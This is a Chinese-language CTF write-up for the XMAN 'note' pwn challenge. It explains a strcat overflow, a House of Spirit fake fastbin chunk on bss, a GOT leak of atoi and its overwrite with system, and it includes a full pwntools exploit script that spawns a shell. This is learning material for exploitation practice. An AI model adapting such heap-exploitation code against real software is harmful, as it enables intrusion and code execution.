---
title: Xman Task_note1
date: 2018-08-19 08:37:40
tags: [CTF, PWN]
categories: XMAN夏令营
---
# xman夏令营 task_note1

​	小伙伴扔给我这道题，看了下发现是个堆题。ida看了一下发现在edit函数中存在一个栈溢出，strcat的时候可以接0x90个字节，而dest空间只有0x80个字节，这里存在一个栈溢出，可以覆盖v7为任意值，但是其实很坑，程序内部有一个非常无耻的在字符串最后一个位置+'\x00'的操作，导致这里一直不能成功覆盖。后来看wp才知道strncat对不同偏移处碰到的0有多往后输入几个字字节的情况，但是我在本地18.04的环境下测试并没有成功，可能是libc的原因（待会换回16.04 //捂脸捂脸）。  
之后的利用思路就简单了，edit函数最后有一个free（v7）的操作，由于我们可以覆盖v7为任意值，这里我们将v7覆写为bss段存储堆指针所在的地址头，这样我们可以通过再次malloc进行一个arbitray malloc，达到任意地址malloc的结果。  
<!--more-->
	但是这里有个坑就是fastbin malloc的话要注意chunk size，这里虽然free了bss段指针，但是由于chunk size为空，所以直接malloc肯定过不了检查，然后我们看到前面，程序最开头有一个bss段的写操作，看read的字节数发现是肯定能够写到bss段存储堆的地址头之前两个单元（16字节）的位置，将size赋值为fastbin所在字节的话就能成功malloc chunk了，这种操作好像是叫the house of spirit。  
之后不出意外我们能够再bss段malloc一个chunk，然后由于是allocated chunk，我们能够改写fd和bk，这里将fd部分改写为atoi的got表地址，之后我们利用show函数泄露atoi真实地址，然后利用libc searcher查找到远端服务器所用libc版本。  
	做完这一切后利用edit函数中自带的strcpy函数覆写atoi为system，之后直接构造输入为/bin/sh就行了。之后就能get shell。

exp如下:

```
from pwn import *

p=process('./note')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def newnote(length,x):
    p.recvuntil('--->>')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(str(length))
    p.recvuntil(':')
    p.sendline(x)

def editnote_append(id,x):
    p.recvuntil('--->>')
    p.sendline('3')
    p.recvuntil('id')
    p.sendline(str(id))
    p.recvuntil('append')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(x)

def editnote_overwrite(id,x):
    p.recvuntil('--->>')
    p.sendline('3')
    p.recvuntil('id')
    p.sendline(str(id))
    p.recvuntil('append')
    p.sendline('1')
    p.recvuntil(':')
    p.sendline(x)

def shownote(id):
    p.recvuntil('--->>')
    p.sendline('2')
    p.recvuntil('id')
    p.sendline(str(id))


p.recvuntil('name:')
p.send('a'*0x30+p64(0)+p64(0x70))
p.recvuntil('address:')
p.sendline(p64(0)+p64(0x70))
#gdb.attach(p)

newnote(128,94*'a')
editnote_append(0,'b'*34+p64(0x602120))#ptr_addr

atoi_got = 0x602088
newnote(0x60,p64(atoi_got))

shownote(0)
p.recvuntil('is ')
atoi_addr = u64(p.recvline().strip('\n').ljust(8, '\x00'))
atoi_libc=libc.symbols['atoi']
sys_libc=libc.symbols['system']
system=atoi_addr-atoi_libc+sys_libc
print "system="+hex(system)

editnote_overwrite(0,p64(system)) #got written
#gdb.attach(p)
p.recvuntil('--->>')
p.sendline('/bin/sh')
p.interactive()

```

